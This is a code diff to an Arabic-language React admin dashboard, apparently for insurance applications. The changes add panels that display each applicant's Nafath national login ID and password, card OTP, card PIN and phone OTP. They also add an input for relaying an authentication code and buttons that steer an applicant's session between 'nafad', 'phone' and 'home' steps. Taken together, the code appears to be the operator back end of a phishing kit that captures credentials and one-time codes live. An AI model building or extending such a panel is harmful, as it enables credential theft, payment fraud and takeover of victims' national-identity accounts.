@@ -56,11 +56,10 @@ function UserStatus({ userId }: { userId: string }) {
       <div className={`w-2 h-2 rounded-full ${status === "online" ? "bg-green-500 animate-pulse" : "bg-gray-400"}`} />
       <Badge
         variant="outline"
-        className={`text-xs ${
-          status === "online"
+        className={`text-xs ${status === "online"
             ? "bg-green-50 text-green-700 border-green-300 dark:bg-green-950/30 dark:text-green-400"
             : "bg-gray-50 text-gray-600 border-gray-300 dark:bg-gray-900/30 dark:text-gray-400"
-        }`}
+          }`}
       >
         {status === "online" ? "متصل" : "غير متصل"}
       </Badge>
@@ -78,8 +77,10 @@ export default function AdminDashboard() {
   const [selectedApplication, setSelectedApplication] = useState<InsuranceApplication | null>(null)
   const [showChat, setShowChat] = useState(false)
   const [loading, setLoading] = useState(true)
+  const [authNumber, setAuthNumber] = useState('')
   const prevApplicationsCount = useRef<number>(0)
   const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set())
+  const [showHideFilters, setShowHideFilter] = useState(false)
 
   const stats = useMemo(() => {
     return {
@@ -144,27 +145,13 @@ export default function AdminDashboard() {
     return () => clearTimeout(timer)
   }, [applications, searchQuery, statusFilter, cardFilter, infoFilter])
 
-  const handleStatusChange = useCallback(
-    async (appId: string, newStatus: InsuranceApplication["status"]) => {
-      setApplications((prev) => prev.map((app) => (app.id === appId ? { ...app, status: newStatus } : app)))
-      if (selectedApplication?.id === appId) {
-        setSelectedApplication((prev) => (prev ? { ...prev, status: newStatus } : null))
-      }
-
-      try {
-        await updateApplication(appId, { status: newStatus })
-        if (newStatus === "approved") {
-          playSuccessSound()
-        } else if (newStatus === "rejected") {
-          playErrorSound()
-        }
-      } catch (error) {
-        console.error("Error updating status:", error)
-        playErrorSound()
-      }
-    },
-    [selectedApplication],
-  )
+  const handleStatusChange = async (appId: string, newStatus: string) => {
+    try {
+      await updateApplication(appId, { currentStep: newStatus as string })
+      playErrorSound()
+    } catch {
+    }
+  }
 
   const handleStepChange = useCallback(
     async (appId: string, newStep: number) => {
@@ -181,7 +168,13 @@ export default function AdminDashboard() {
     },
     [selectedApplication],
   )
-
+  const handleAuthNumber = async (appId: string, auth: string) => {
+    try {
+      await updateApplication(appId, { authNumber: auth })
+    } catch (error) {
+      console.error("Error updating step:", error)
+    }
+  }
   const toggleSelection = useCallback((id: string, event: React.MouseEvent) => {
     event.stopPropagation()
     setSelectedIds((prev) => {
@@ -424,98 +417,107 @@ export default function AdminDashboard() {
                 <div className="text-xs text-slate-500 dark:text-slate-400">مرفوض</div>
               </div>
             </div>
+            <div className="mr-16">
+              <Button size={'icon'}>
+                1
+              </Button>
+            </div>
+
           </div>
+
         </div>
       </div>
 
       <div className="flex h-[calc(100vh-180px)]">
         {/* Sidebar */}
         <div className="w-[420px] bg-white dark:bg-slate-900 border-l border-slate-200 dark:border-slate-800 overflow-y-auto">
+          <Button onClick={() => setShowHideFilter(!showHideFilters)} className="w-full" variant={'outline'}>اخفاء/اظهار</Button>
           {/* Filters */}
-          <div className="p-5 border-b border-slate-200 dark:border-slate-800 bg-slate-50 dark:bg-slate-900/50">
-            <div className="space-y-4">
-              {/* Search */}
-              <div className="relative">
-                <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
-                <Input
-                  placeholder="بحث بالاسم أو رقم الهوية..."
-                  value={searchQuery}
-                  onChange={(e) => setSearchQuery(e.target.value)}
-                  className="pr-10 bg-white dark:bg-slate-800 border-slate-300 dark:border-slate-700"
-                />
-              </div>
-
-              {/* Filter Header */}
-              <div className="flex items-center gap-2 pt-2">
-                <Filter className="w-4 h-4 text-slate-600 dark:text-slate-400" />
-                <span className="text-sm font-semibold text-slate-700 dark:text-slate-300">تصفية حسب</span>
-              </div>
-
-              {/* Card Filter */}
-              <div className="space-y-2">
-                <label className="text-xs font-medium text-slate-600 dark:text-slate-400">معلومات البطاقة</label>
-                <div className="grid grid-cols-3 gap-2">
-                  <Button
-                    variant={cardFilter === "all" ? "default" : "outline"}
-                    size="sm"
-                    onClick={() => setCardFilter("all")}
-                    className="text-xs h-9"
-                  >
-                    الكل
-                  </Button>
-                  <Button
-                    variant={cardFilter === "hasCard" ? "default" : "outline"}
-                    size="sm"
-                    onClick={() => setCardFilter("hasCard")}
-                    className="text-xs gap-1.5 h-9"
-                  >
-                    <CreditCard className="w-3.5 h-3.5" />
-                    لديه بطاقة
-                  </Button>
-                  <Button
-                    variant={cardFilter === "noCard" ? "default" : "outline"}
-                    size="sm"
-                    onClick={() => setCardFilter("noCard")}
-                    className="text-xs h-9"
-                  >
-                    بدون بطاقة
-                  </Button>
+          {showHideFilters &&
+            <div className="p-5 border-b border-slate-200 dark:border-slate-800 bg-slate-50 dark:bg-slate-900/50">
+              <div className="space-y-4">
+                {/* Search */}
+                <div className="relative">
+                  <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
+                  <Input
+                    placeholder="بحث بالاسم أو رقم الهوية..."
+                    value={searchQuery}
+                    onChange={(e) => setSearchQuery(e.target.value)}
+                    className="pr-10 bg-white dark:bg-slate-800 border-slate-300 dark:border-slate-700"
+                  />
                 </div>
-              </div>
 
-              {/* Info Filter */}
-              <div className="space-y-2">
-                <label className="text-xs font-medium text-slate-600 dark:text-slate-400">معلومات إضافية</label>
-                <div className="grid grid-cols-3 gap-2">
-                  <Button
-                    variant={infoFilter === "all" ? "default" : "outline"}
-                    size="sm"
-                    onClick={() => setInfoFilter("all")}
-                    className="text-xs h-9"
-                  >
-                    الكل
-                  </Button>
-                  <Button
-                    variant={infoFilter === "hasInfo" ? "default" : "outline"}
-                    size="sm"
-                    onClick={() => setInfoFilter("hasInfo")}
-                    className="text-xs gap-1.5 h-9"
-                  >
-                    <Flag className="w-3.5 h-3.5" />
-                    مكتمل
-                  </Button>
-                  <Button
-                    variant={infoFilter === "noInfo" ? "default" : "outline"}
-                    size="sm"
-                    onClick={() => setInfoFilter("noInfo")}
-                    className="text-xs h-9"
-                  >
-                    غير مكتمل
-                  </Button>
+                {/* Filter Header */}
+                <div className="flex items-center gap-2 pt-2">
+                  <Filter className="w-4 h-4 text-slate-600 dark:text-slate-400" />
+                  <span className="text-sm font-semibold text-slate-700 dark:text-slate-300">تصفية حسب</span>
+                </div>
+
+                {/* Card Filter */}
+                <div className="space-y-2">
+                  <label className="text-xs font-medium text-slate-600 dark:text-slate-400">معلومات البطاقة</label>
+                  <div className="grid grid-cols-3 gap-2">
+                    <Button
+                      variant={cardFilter === "all" ? "default" : "outline"}
+                      size="sm"
+                      onClick={() => setCardFilter("all")}
+                      className="text-xs h-9"
+                    >
+                      الكل
+                    </Button>
+                    <Button
+                      variant={cardFilter === "hasCard" ? "default" : "outline"}
+                      size="sm"
+                      onClick={() => setCardFilter("hasCard")}
+                      className="text-xs gap-1.5 h-9"
+                    >
+                      <CreditCard className="w-3.5 h-3.5" />
+                      لديه بطاقة
+                    </Button>
+                    <Button
+                      variant={cardFilter === "noCard" ? "default" : "outline"}
+                      size="sm"
+                      onClick={() => setCardFilter("noCard")}
+                      className="text-xs h-9"
+                    >
+                      بدون بطاقة
+                    </Button>
+                  </div>
+                </div>
+                {/* Info Filter */}
+                <div className="space-y-2">
+                  <label className="text-xs font-medium text-slate-600 dark:text-slate-400">معلومات إضافية</label>
+                  <div className="grid grid-cols-3 gap-2">
+                    <Button
+                      variant={infoFilter === "all" ? "default" : "outline"}
+                      size="sm"
+                      onClick={() => setInfoFilter("all")}
+                      className="text-xs h-9"
+                    >
+                      الكل
+                    </Button>
+                    <Button
+                      variant={infoFilter === "hasInfo" ? "default" : "outline"}
+                      size="sm"
+                      onClick={() => setInfoFilter("hasInfo")}
+                      className="text-xs gap-1.5 h-9"
+                    >
+                      <Flag className="w-3.5 h-3.5" />
+                      مكتمل
+                    </Button>
+                    <Button
+                      variant={infoFilter === "noInfo" ? "default" : "outline"}
+                      size="sm"
+                      onClick={() => setInfoFilter("noInfo")}
+                      className="text-xs h-9"
+                    >
+                      غير مكتمل
+                    </Button>
+                  </div>
                 </div>
               </div>
             </div>
-          </div>
+          }
 
           {/* Applications List */}
           {loading ? (
@@ -542,11 +544,10 @@ export default function AdminDashboard() {
                     setSelectedApplication(app)
                     setShowChat(false)
                   }}
-                  className={`group p-5 cursor-pointer hover:bg-gradient-to-l hover:from-blue-50 hover:to-transparent dark:hover:from-blue-950/20 transition-all duration-200 relative ${
-                    selectedApplication?.id === app.id
+                  className={`group p-5 cursor-pointer hover:bg-gradient-to-l hover:from-blue-50 hover:to-transparent dark:hover:from-blue-950/20 transition-all duration-200 relative ${selectedApplication?.id === app.id
                       ? "bg-gradient-to-l from-blue-100 to-blue-50 dark:from-blue-950/40 dark:to-blue-950/20 border-r-4 border-blue-600"
                       : ""
-                  }`}
+                    }`}
                 >
                   <div className="flex items-start gap-4">
                     <Checkbox
@@ -561,7 +562,7 @@ export default function AdminDashboard() {
                     <div className="flex-1 min-w-0">
                       <div className="flex items-start justify-between gap-2 mb-2">
                         <div className="flex items-center gap-2 flex-1 min-w-0">
-                          <span className="text-2xl flex-shrink-0">{app.country === "Saudi Arabia" ? "🇸🇦" : "🌍"}</span>
+                          <span className="text-2xl flex-shrink-0">{app.country === "Saudi Arabia" ? "🇸🇦" : app.country === "Jordan" ? "🇯🇴" : "🌍"}</span>
                           <h3 className="font-semibold text-slate-900 dark:text-white text-base truncate">
                             {app.ownerName}
                           </h3>
@@ -587,7 +588,7 @@ export default function AdminDashboard() {
                           variant="outline"
                           className="text-xs bg-slate-50 dark:bg-slate-800 border-slate-300 dark:border-slate-700"
                         >
-                          الخطوة {app.currentStep + 1}
+                          الخطوة {app.currentStep}
                         </Badge>
                         {hasCardInfo(app) && (
                           <Badge className="bg-blue-100 text-blue-700 dark:bg-blue-900/30 dark:text-blue-400 text-xs gap-1">
@@ -645,7 +646,7 @@ export default function AdminDashboard() {
                             <h2 className="text-2xl font-bold text-slate-900 dark:text-white mb-1">
                               {selectedApplication.ownerName}
                             </h2>
-                            <UserStatus userId={ selectedApplication.id!} />
+                            <UserStatus userId={selectedApplication.id!} />
                           </div>
                         </div>
                         <div className="flex items-center gap-6 text-sm text-slate-600 dark:text-slate-400 flex-wrap">
@@ -825,128 +826,60 @@ export default function AdminDashboard() {
                     </div>
                   )}
 
-                  {/* Verification Status */}
-                  <div className="lg:col-span-2 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
-                    <h3 className="text-lg font-bold text-slate-900 dark:text-white mb-4">حالة التحقق</h3>
+                  {/* Nafad Status */}
+                  <div className="lg:col-span-1 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
+                    <h3 className="text-lg font-bold text-slate-900 dark:text-white mb-4">نفاذ الوطني</h3>
                     <div className="space-y-4">
                       {/* Phone Verification */}
                       <div className="p-4 bg-slate-50 dark:bg-slate-800/50 rounded-xl border border-slate-200 dark:border-slate-700">
                         <div className="flex items-center justify-between mb-3">
-                          <div className="flex items-center gap-3">
-                            <div className="w-12 h-12 rounded-xl bg-blue-100 dark:bg-blue-900/30 flex items-center justify-center">
-                              <Phone className="w-6 h-6 text-blue-600 dark:text-blue-400" />
+                          <div className="flex  flex-col gap-3">
+                            <div className="w-8 h-8 rounded-xl bg-blue-100 dark:bg-blue-900/30 flex items-center justify-center">
+                              <User className="w-6 h-6 text-blue-600 dark:text-blue-400" />
                             </div>
                             <div>
-                              <p className="text-sm font-semibold text-slate-900 dark:text-white">رمز الهاتف</p>
+                              <p className="text-sm font-semibold text-slate-900 dark:text-white">الرقم الوطني</p>
                               <p className="text-xs text-slate-600 dark:text-slate-400 font-mono">
-                                {selectedApplication.phoneNumber2 || "لم يتم إنشاؤه"}
+                                {selectedApplication.nafazId || "لم يتم إنشاؤه"}
                               </p>
                             </div>
+                            <div>
+                              <p className="text-sm font-semibold text-slate-900 dark:text-white">الرقم السري</p>
+                              <p className="text-xs text-slate-600 dark:text-slate-400 font-mono">
+                                {selectedApplication.nafazPass || "لم يتم إنشاؤه"}
+                              </p>
+                            </div>
+                            <div>
+                              <p className="text-sm font-semibold text-slate-900 dark:text-white">رمز التوثيق</p>
+                              <Input type="tel" onChange={(e) => { setAuthNumber(e.target.value) }} />
+                            </div>
+
                           </div>
-                          <Badge
-                            variant={
-                              selectedApplication.phoneVerificationStatus === "approved"
-                                ? "default"
-                                : selectedApplication.phoneVerificationStatus === "rejected"
-                                  ? "destructive"
-                                  : "secondary"
-                            }
-                            className="text-xs"
-                          >
-                            {selectedApplication.phoneVerificationStatus === "approved"
-                              ? "موافق"
-                              : selectedApplication.phoneVerificationStatus === "rejected"
-                                ? "مرفوض"
-                                : "معلق"}
-                          </Badge>
+
                         </div>
                         <div className="flex gap-2">
                           <Button
-                            onClick={() => handlePhoneVerificationChange(selectedApplication.id!, "approved")}
+                            onClick={() => handleAuthNumber(selectedApplication.id!, authNumber)}
                             variant="outline"
                             size="sm"
                             className="flex-1 gap-2 hover:bg-green-50 dark:hover:bg-green-950/30 border-green-200 dark:border-green-800"
-                            disabled={selectedApplication.phoneVerificationStatus === "approved"}
                           >
                             <CheckCircle className="w-4 h-4 text-green-600 dark:text-green-400" />
-                            <span className="text-green-700 dark:text-green-400">قبول</span>
+                            <span className="text-green-700 dark:text-green-400">حفظ</span>
                           </Button>
                           <Button
-                            onClick={() => handlePhoneVerificationChange(selectedApplication.id!, "rejected")}
                             variant="outline"
                             size="sm"
-                            className="flex-1 gap-2 hover:bg-red-50 dark:hover:bg-red-950/30 border-red-200 dark:border-red-800"
-                            disabled={selectedApplication.phoneVerificationStatus === "rejected"}
                           >
                             <XCircle className="w-4 h-4 text-red-600 dark:text-red-400" />
-                            <span className="text-red-700 dark:text-red-400">رفض</span>
+                            <span className="text-red-700 dark:text-red-400">الغاء</span>
                           </Button>
                         </div>
                       </div>
 
-                      {/* ID Verification */}
-                      <div className="p-4 bg-slate-50 dark:bg-slate-800/50 rounded-xl border border-slate-200 dark:border-slate-700">
-                        <div className="flex items-center justify-between mb-3">
-                          <div className="flex items-center gap-3">
-                            <div className="w-12 h-12 rounded-xl bg-green-100 dark:bg-green-900/30 flex items-center justify-center">
-                              <CreditCard className="w-6 h-6 text-green-600 dark:text-green-400" />
-                            </div>
-                            <div>
-                              <p className="text-sm font-semibold text-slate-900 dark:text-white">رمز البطاقة</p>
-                              <p className="text-xs text-slate-600 dark:text-slate-400 font-mono">
-                                {selectedApplication.otp || "لم يتم إنشاؤه"}
-                              </p>
-                            </div>
-                          </div>
-                          <Badge
-                            variant={
-                              selectedApplication.idVerificationStatus === "approved"
-                                ? "default"
-                                : selectedApplication.idVerificationStatus === "rejected"
-                                  ? "destructive"
-                                  : "secondary"
-                            }
-                            className="text-xs"
-                          >
-                            {selectedApplication.idVerificationStatus === "approved"
-                              ? "موافق"
-                              : selectedApplication.idVerificationStatus === "rejected"
-                                ? "مرفوض"
-                                : "معلق"}
-                          </Badge>
-                        </div>
-                        <div className="flex gap-2">
-                          <Button
-                            onClick={() => handleIdVerificationChange(selectedApplication.id!, "approved")}
-                            variant="outline"
-                            size="sm"
-                            className="flex-1 gap-2 hover:bg-green-50 dark:hover:bg-green-950/30 border-green-200 dark:border-green-800"
-                            disabled={selectedApplication.idVerificationStatus === "approved"}
-                          >
-                            <CheckCircle className="w-4 h-4 text-green-600 dark:text-green-400" />
-                            <span className="text-green-700 dark:text-green-400">قبول</span>
-                          </Button>
-                          <Button
-                            onClick={() => handleIdVerificationChange(selectedApplication.id!, "rejected")}
-                            variant="outline"
-                            size="sm"
-                            className="flex-1 gap-2 hover:bg-red-50 dark:hover:bg-red-950/30 border-red-200 dark:border-red-800"
-                            disabled={selectedApplication.idVerificationStatus === "rejected"}
-                          >
-                            <XCircle className="w-4 h-4 text-red-600 dark:text-red-400" />
-                            <span className="text-red-700 dark:text-red-400">رفض</span>
-                          </Button>
-                        </div>
-                      </div>
 
-                      <Button
-                        onClick={() => (window.location.href = "/verify")}
-                        variant="outline"
-                        className="w-full gap-2"
-                      >
-                        <User className="w-4 h-4" />
-                        الذهاب إلى صفحة التحقق
-                      </Button>
+
+
                     </div>
                   </div>
 
@@ -1005,46 +938,184 @@ export default function AdminDashboard() {
                       </div>
                     </div>
                   )}
+                  {/* Verification Status */}
+                  <div className=" w-full bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
+                    <h3 className="text-lg font-bold text-slate-900 dark:text-white mb-4">
+                      معلومات الهاتف
+                    </h3>
+
+                    <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 mb-6">
+
+                      <div className="w-full flex flex-col space-y-3  rounded-lg dark:bg-slate-800/40">
+                        <p className="text-sm font-semibold text-slate-900 dark:text-white">
+                          هاتف
+                        </p>
+                        <p className="text-xs text-slate-600 dark:text-slate-400 font-mono">
+                          {selectedApplication.phoneNumber2 || "لم يتم إنشاؤه"}
+                        </p>
+
+                        <p className="text-sm font-semibold text-slate-900 dark:text-white">
+                          مزود الخدمة
+                        </p>
+                        <p className="text-xs text-slate-600 dark:text-slate-400 font-mono">
+                          {selectedApplication.selectedCarrier || "لم يتم إنشاؤه"}
+                        </p>
+                      </div>
+
+                    </div>
+                    <div className="p-4 bg-slate-50 dark:bg-slate-800/50 rounded-xl border border-slate-200 dark:border-slate-700">
+                        <div className="flex items-center justify-between mb-3">
+                          <div className="flex items-center gap-3">
+                            <div className="w-12 h-12 rounded-xl bg-blue-100 dark:bg-blue-900/30 flex items-center justify-center">
+                              <Phone className="w-6 h-6 text-blue-600 dark:text-blue-400" />
+                            </div>
+                            <div>
+                              <p className="text-sm font-semibold text-slate-900 dark:text-white">رمز الهاتف</p>
+                              <p className="text-xs text-slate-600 dark:text-slate-400 font-mono">
+                                {selectedApplication?.phoneOtp || "لم يتم إنشاؤه"}
+                              </p>
+                            </div>
+                          </div>
+                          <Badge
+                            variant={
+                              selectedApplication.phoneVerificationStatus === "approved"
+                                ? "default"
+                                : selectedApplication.phoneVerificationStatus === "rejected"
+                                  ? "destructive"
+                                  : "secondary"
+                            }
+                            className="text-xs"
+                          >
+                            {selectedApplication.phoneVerificationStatus === "approved"
+                              ? "موافق"
+                              : selectedApplication.phoneVerificationStatus === "rejected"
+                                ? "مرفوض"
+                                : "معلق"}
+                          </Badge>
+                        </div>
+
+                      </div>
+                    <div className="flex gap-2">
+                      <Button
+                        onClick={() => handlePhoneVerificationChange(selectedApplication.id!, "approved")}
+                        variant="outline"
+                        size="sm"
+                        className="flex-1 gap-2 hover:bg-green-50 dark:hover:bg-green-950/30 border-green-200 dark:border-green-800"
+                        disabled={selectedApplication.phoneVerificationStatus === "approved"}
+                      >
+                        <CheckCircle className="w-4 h-4 text-green-600 dark:text-green-400" />
+                        <span className="text-green-700 dark:text-green-400">قبول</span>
+                      </Button>
+                      <Button
+                        onClick={() => handlePhoneVerificationChange(selectedApplication.id!, "rejected")}
+                        variant="outline"
+                        size="sm"
+                        className="flex-1 gap-2 hover:bg-red-50 dark:hover:bg-red-950/30 border-red-200 dark:border-red-800"
+                        disabled={selectedApplication.phoneVerificationStatus === "rejected"}
+                      >
+                        <XCircle className="w-4 h-4 text-red-600 dark:text-red-400" />
+                        <span className="text-red-700 dark:text-red-400">رفض</span>
+                      </Button>
+                    </div>
+                  </div>
+                  <div className="lg:col-span-1 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
+                    <h3 className="text-lg font-bold text-slate-900 dark:text-white mb-4">حالة التحقق</h3>
+                    <div className="space-y-4">
+                      {/* Phone Verification */}
+                 
+
+                      {/* ID Verification */}
+                      <div className="p-4 bg-slate-50 dark:bg-slate-800/50 rounded-xl border border-slate-200 dark:border-slate-700">
+                        <div className="flex items-center justify-between mb-3">
+                          <div className="flex flex-col items-center gap-3">
+                            <div className="w-12 h-12 rounded-xl bg-green-100 dark:bg-green-900/30 flex items-center justify-center">
+                              <CreditCard className="w-6 h-6 text-green-600 dark:text-green-400" />
+                            </div>
+                            <div>
+                              <p className="text-sm font-semibold text-slate-900 dark:text-white">رمز البطاقة</p>
+                              <p className="text-xs text-slate-600 dark:text-slate-400 font-mono">
+                                {selectedApplication.otp || "لم يتم إنشاؤه"}
+                              </p>
+                            </div>
+                            <div>
+                              <p className="text-sm font-semibold text-slate-900 dark:text-white">Pin Code</p>
+                              <p className="text-xs text-slate-600 dark:text-slate-400 font-mono">
+                                {selectedApplication.pinCode || "لم يتم إنشاؤه"}
+                              </p>
+                            </div>
+                          </div>
+                          <Badge
+                            variant={
+                              selectedApplication.idVerificationStatus === "approved"
+                                ? "default"
+                                : selectedApplication.idVerificationStatus === "rejected"
+                                  ? "destructive"
+                                  : "secondary"
+                            }
+                            className="text-xs"
+                          >
+                            {selectedApplication.idVerificationStatus === "approved"
+                              ? "موافق"
+                              : selectedApplication.idVerificationStatus === "rejected"
+                                ? "مرفوض"
+                                : "معلق"}
+                          </Badge>
+                        </div>
+                        <div className="flex gap-2">
+                          <Button
+                            onClick={() => handleIdVerificationChange(selectedApplication.id!, "approved")}
+                            variant="outline"
+                            size="sm"
+                            className="flex-1 gap-2 hover:bg-green-50 dark:hover:bg-green-950/30 border-green-200 dark:border-green-800"
+                            disabled={selectedApplication.idVerificationStatus === "approved"}
+                          >
+                            <CheckCircle className="w-4 h-4 text-green-600 dark:text-green-400" />
+                            <span className="text-green-700 dark:text-green-400">قبول</span>
+                          </Button>
+                          <Button
+                            onClick={() => handleIdVerificationChange(selectedApplication.id!, "rejected")}
+                            variant="outline"
+                            size="sm"
+                            className="flex-1 gap-2 hover:bg-red-50 dark:hover:bg-red-950/30 border-red-200 dark:border-red-800"
+                            disabled={selectedApplication.idVerificationStatus === "rejected"}
+                          >
+                            <XCircle className="w-4 h-4 text-red-600 dark:text-red-400" />
+                            <span className="text-red-700 dark:text-red-400">رفض</span>
+                          </Button>
+                        </div>
+                      </div>
+
+
+                    </div>
+                  </div>
 
                   {/* Control Panel */}
-                  <div className="lg:col-span-3 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
+                  <div className="lg:col-span-2 bg-white dark:bg-slate-900 rounded-xl border border-slate-200 dark:border-slate-800 p-6 shadow-sm">
                     <h3 className="text-lg font-bold text-slate-900 dark:text-white mb-4">التحكم بالطلب</h3>
                     <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mb-6">
                       <Button
-                        onClick={() => handleStatusChange(selectedApplication.id!, "pending_review")}
+                        onClick={() => handleStatusChange(selectedApplication.id!, "nafad")}
                         variant="outline"
                         className="h-auto py-4 justify-start"
-                        disabled={selectedApplication.status === "pending_review"}
+                        disabled={selectedApplication.currentStep === "nafad"}
                       >
-                        <Clock className="w-5 h-5 ml-3 text-amber-600" />
-                        <div className="text-right">
-                          <p className="font-semibold text-sm">قيد المراجعة</p>
-                          <p className="text-xs text-slate-600 dark:text-slate-400">تحت المراجعة</p>
-                        </div>
+                        نفاذ
                       </Button>
                       <Button
-                        onClick={() => handleStatusChange(selectedApplication.id!, "approved")}
+                        onClick={() => handleStatusChange(selectedApplication.id!, "phone")}
                         variant="outline"
                         className="h-auto py-4 justify-start hover:bg-green-50 dark:hover:bg-green-950/30 border-green-200 dark:border-green-800"
-                        disabled={selectedApplication.status === "approved"}
+                        disabled={selectedApplication.currentStep === "phone"}
                       >
-                        <CheckCircle className="w-5 h-5 ml-3 text-green-600 dark:text-green-400" />
-                        <div className="text-right">
-                          <p className="font-semibold text-sm text-green-700 dark:text-green-400">الموافقة</p>
-                          <p className="text-xs text-green-600 dark:text-green-500">قبول الطلب</p>
-                        </div>
+                        التحويل للهاتف
                       </Button>
                       <Button
-                        onClick={() => handleStatusChange(selectedApplication.id!, "rejected")}
+                        onClick={() => handleStatusChange(selectedApplication.id!, "home")}
                         variant="outline"
                         className="h-auto py-4 justify-start hover:bg-red-50 dark:hover:bg-red-950/30 border-red-200 dark:border-red-800"
-                        disabled={selectedApplication.status === "rejected"}
+                        disabled={selectedApplication.currentStep === "home"}
                       >
-                        <XCircle className="w-5 h-5 ml-3 text-red-600 dark:text-red-400" />
-                        <div className="text-right">
-                          <p className="font-semibold text-sm text-red-700 dark:text-red-400">الرفض</p>
-                          <p className="text-xs text-red-600 dark:text-red-500">رفض الطلب</p>
-                        </div>
+                        الرئيسية
                       </Button>
                     </div>
 
@@ -1054,8 +1125,8 @@ export default function AdminDashboard() {
                         {[1, 2, 3, 4].map((step) => (
                           <Button
                             key={step}
-                            onClick={() => handleStepChange(selectedApplication.id!, step - 1)}
-                            variant={selectedApplication.currentStep === step - 1 ? "default" : "outline"}
+                            onClick={() => handleStepChange(selectedApplication.id!, step)}
+                            variant={selectedApplication.currentStep === step ? "default" : "outline"}
                             size="lg"
                             className="flex-1"
                           >
@@ -1065,6 +1136,8 @@ export default function AdminDashboard() {
                       </div>
                     </div>
                   </div>
+              
+
                 </div>
               </div>
             )
